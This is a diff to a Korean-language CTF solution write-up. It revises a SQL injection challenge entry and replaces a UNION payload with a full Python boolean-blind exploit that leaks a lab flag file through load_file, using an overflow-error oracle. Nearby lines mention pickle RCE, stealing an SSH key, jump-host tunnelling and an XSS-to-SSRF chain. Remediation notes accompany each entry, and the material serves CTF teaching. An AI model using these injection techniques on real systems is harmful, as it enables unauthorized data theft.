@@ -335,21 +335,34 @@ print(rce(chain))      # → flag{...}
 > 사람이 직접 풀 땐: RCE 로 `id_rsa` 를 빼낸 뒤 `ssh -i id_rsa -p2222 appuser@<host>` 로 extserver 접속 → 위와 동일하게 `-J ctfuser@intserver flaguser@flagserver` 점프(터널)로 내부 flagserver 접근.
 - **대응**: 신뢰경계 입력에 `pickle` 금지(JSON 등 안전 포맷) · 서명키/자격증명 비공개·분리 · 내부망 접근통제·점프호스트 최소권한(restricted shell 만으론 터널 못 막음 → `AllowTcpForwarding no`).
 
-### fsi-chat-sqli (:9090) — FSI 채팅 SQLi 파일유출 (LOAD_FILE)  ✓ 실익스플로잇 검증됨
-- **취약점**: `ext/app.py` 의 다른 쿼리는 `safeQuery()`(`" \ | & [ ] ! @ # $ %` 이스케이프)를 거치지만 **`download()` 만 `filepath` 를 그대로** f-string 에 넣는다 → raw SQLi. 게다가 첫 쿼리 결과(`fileOwner`)가 내 세션 userid 와 다르면 **그 값을 에러 문자열로 반환**한다:
-  `select loginid from board where filepath="{filepath}" limit 0,1` → owner!=me → `"file owner({fileOwner})!=loginid({me})"`.
+### fsi-chat-sqli (:9090) — FSI 채팅 SQLi 파일유출 (error-based blind)  ✓ 실익스플로잇 검증됨
+- **취약점**: `ext/app.py` 의 다른 쿼리는 `safeQuery()`(`" \ | & [ ] ! @ # $ %` 이스케이프)를 거치지만 **`download()` 만 `filepath` 를 그대로** f-string 에 넣는다 → raw SQLi(`"` 미이스케이프로 문자열 탈출).
+  `select loginid from board where filepath="{filepath}" limit 0,1`.
   db 는 `--secure-file-priv="/upload/"` 라 `/upload/flag.txt`(=SQLi flag) 를 `load_file` 가능.
+- **보정(의도된 난이도)**: `download()` 는 ① `union|select|extractvalue|updatexml|sleep|benchmark` 키워드 거부 ② 원본 SQL 에러·소유자 값 미반영(generic `"download error.."`). → **UNION 직접추출·에러메시지(XPATH) 추출·시간기반이 모두 막힌다.** 관측 가능한 신호는 *‘쿼리 에러 발생 여부’* 하나뿐 → **산술 오버플로 boolean-blind** 가 정공법.
+- **익스 원리**: `filepath = zz" or if(<COND>, 0xffffffffffffffff*0xffffffffffffffff, 0)-- -`
+  - `COND` 참 → `0xff..*0xff..` 평가 → **BIGINT UNSIGNED out of range**(1690) → 응답 `"download error.."`
+  - `COND` 거짓 → `if`=0 → where 거짓 → 응답 `"select result has no data"`
+  - `COND = ascii(substr(load_file(0x2f75706c6f61642f666c61672e747874), i, 1)) > mid` (경로 `/upload/flag.txt` 는 따옴표 충돌 회피로 hex, 한 글자씩 이분탐색)
 - **풀이(파이썬)** — `solution/fsi_sqli.py`:
 ```python
 import requests, re
-B="http://localhost:9090"; s=requests.Session()
+B="http://localhost:9090"; s=requests.Session(); FILE="0x2f75706c6f61642f666c61672e747874"
 s.post(B+"/register",data={"userid":"u1","userpw":"p1"}); s.post(B+"/login",data={"userid":"u1","userpw":"p1"})
-# download() 는 safeQuery 미적용 → " 로 탈출하여 UNION 으로 fileOwner 자리에 파일내용을 끼움
-fp='X" union select load_file("/upload/flag.txt") -- -'
-r=s.get(B+"/download",params={"filepath":fp})
-print(re.search(r"fsi2022\{[^}]*\}", r.text).group(0))   # → fsi2022{yes_y0u_c4n_le4k_fi1e_by_sq1i!}
+def err(cond):  # cond 참이면 오버플로 에러
+    p='zz" or if(%s, 0xffffffffffffffff*0xffffffffffffffff, 0)-- -' % cond
+    return "download error" in s.get(B+"/download",params={"filepath":p}).text
+flag=""
+for i in range(1,80):
+    if not err("ascii(substr(load_file(%s),%d,1))>0"%(FILE,i)): break
+    lo,hi=0,128
+    while lo+1<hi:
+        m=(lo+hi)//2
+        lo,hi=(m,hi) if err("ascii(substr(load_file(%s),%d,1))>%d"%(FILE,i,m)) else (lo,m)
+    flag+=chr(hi)
+print(re.search(r"fsi2022\{[^}]*\}",flag).group(0))   # → fsi2022{yes_y0u_c4n_le4k_fi1e_by_sq1i!}
 ```
-- **대응**: 모든 사용자입력에 동일 필터/파라미터 바인딩 적용 · `load_file` 결과를 에러 메시지로 반환 금지 · `secure-file-priv` 와 DB 계정 `FILE` 권한 최소화.
+- **대응**: `filepath` 도 파라미터 바인딩/화이트리스트(파일명 패턴)로 처리 — 키워드 블랙리스트는 우회 가능하므로 근본해법 아님 · `secure-file-priv` 와 DB 계정 `FILE` 권한 최소화 · 에러/분기 응답을 단일화해 oracle 자체를 제거.
 
 ### fsi-chat-xss (:9090) — FSI 채팅 XSS → SSRF → 내부보드 flag 탈취  ✓ 체인 검증됨(봇 클릭만 버전부패)
 - **구성**: `external`(10.111.0.3, 공개보드) · `internal`(10.111.0.4: **author 검사 없는** 내부보드 `int/app.py` + **admin 봇** `bot.py`) · db 공유. 봇은 egress 방화벽(`OUTPUT DROP`)으로 10.111.0.3/10.111.0.5 만 통신 → 외부 리스너 탈취 불가, **공유 DB 경유**가 정공법.
